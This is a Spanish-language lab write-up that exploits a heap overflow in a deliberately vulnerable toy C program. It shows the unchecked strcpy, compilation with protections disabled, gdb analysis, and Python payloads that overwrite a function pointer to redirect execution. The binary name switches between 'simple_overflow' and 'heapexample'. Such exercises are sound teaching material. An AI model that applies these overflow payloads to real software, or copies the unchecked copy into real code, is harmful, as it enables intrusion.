# Simple Overflow
## Código VUlnerable
Aquí una muestra del código vulnerable del PDF proporcionado 
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct sdata {
    char buffer[64];
};

struct sfp {
    int (*fp)();
};

void fentrar() {
    printf("Pasando\n");
}

void fesperofuera() {
    printf("Esperando fuera\n");
}

int main(int argc, char **argv) {
    struct sdata *smidat;
    struct sfp *f;

    smidat = malloc(sizeof(struct sdata));
    f = malloc(sizeof(struct sfp));
    f->fp = fesperofuera;

    printf("data: esta en [%p], el puntero fp esta en [%p]\n", smidat, f);

    strcpy(smidat->buffer, argv[1]);  // Vulnerabilidad

    f->fp();
}
```

Luego, compilamos y ejecutamos:
```
gcc simple_overflow.c -w -g -no-pie -z execstack -o simple_overflow
./simple_overflow Hola
```

<img width="592" height="138" alt="Captura de pantalla 2025-11-05 190709" src="https://github.com/user-attachments/assets/1806e3a2-c668-447c-8829-e6eaf1cc238d" />

## Analizar el comportamiento
Ahora, se abre el programa en el depurador
```
gdb ./simple_overflow

(gdb) list 25,40
(gdb) b 35
(gdb) run XXXX
(gdb) info proc map
```

<img width="666" height="535" alt="Captura de pantalla 2025-11-05 191659" src="https://github.com/user-attachments/assets/1cc814ad-0266-4e49-9a19-60070d5c9e2a" />

<img width="1069" height="626" alt="Captura de pantalla 2025-11-05 192639" src="https://github.com/user-attachments/assets/af122bf8-ff88-4724-a6c8-3f090d9b83d6" />

A continuación, examinamos la memoria del heap con la dirección proporcionada:
```
x/240x 0x7fffffffddd8
```

<img width="625" height="872" alt="Captura de pantalla 2025-11-05 192832" src="https://github.com/user-attachments/assets/b36460d9-a2c5-408d-80fb-d4fa6c085aad" />

Después se desensambla la función fesperofuera:
```
disassemble fesperofuera
```

<img width="597" height="178" alt="Captura de pantalla 2025-11-05 193314" src="https://github.com/user-attachments/assets/eb9c55e4-b4b8-42fe-ac32-22cf52034767" />

## Crear un payload inicial
Primero, se crea otro archivo de prueba de python:
```
#!/usr/bin/python
print('X' * 90)
```

Luego, ejecutamos esto:
```
chmod +x pp1.py
./pp1.py
./heapexample $(./pp1.py)
```

<img width="520" height="89" alt="Captura de pantalla 2025-11-05 194339" src="https://github.com/user-attachments/assets/3825d519-1b4d-408f-9b21-7aaf8fea03bf" />

## Calcular la distancia exacta
Primero, se crea otro archivo de prueba de python:
```
#!/usr/bin/python
print('X' * 70 + 'YAYBYCYDYEYFYG')
```

Luego, ejecutamos GBD:
```
gdb -q ./simple_overflow
(gdb) run $(./pp2.py)
(gdb) info registers
(gdb) q
```

<img width="639" height="614" alt="Captura de pantalla 2025-11-05 195303" src="https://github.com/user-attachments/assets/81366113-07f8-4036-a376-33cd756f7872" />

Para ajustar la longitud precisa, cambiamos el codigo de pp2.py en pp3.py:
```
#!/usr/bin/python
print('X' * 80 + 'CDEF')
```

Luego ejecutamos de nuevo:
```
gdb -q ./simple_overflow
(gdb) run $(./pp3.py)
(gdb) info registers
(gdb) q
```

<img width="640" height="626" alt="image" src="https://github.com/user-attachments/assets/00f37725-5ca9-4fd5-aa30-97a77e73513f" />

## Redirigir la ejecución a fentrar
Primero buscamos la dirección de fentrar():
```
objdump -d simple_overflow | grep fentrar
```

<img width="386" height="91" alt="Captura de pantalla 2025-11-05 195609" src="https://github.com/user-attachments/assets/90b7eb84-a454-4fad-baa0-68831088a356" />

De nuevo, creamos un archivo de python (pp4.py):
```
#!/usr/bin/python
print('X' * 80 + '\x56\x11\x40\x00')
```

Para finalizar, ejecutamos esto y ya sale todo bien:
```
chmod +x pp4.py
./heapexample $(./pp4.py)
```

<img width="497" height="86" alt="Captura de pantalla 2025-11-05 200035" src="https://github.com/user-attachments/assets/be7cd210-4a63-493f-8b49-078d06d29edc" />

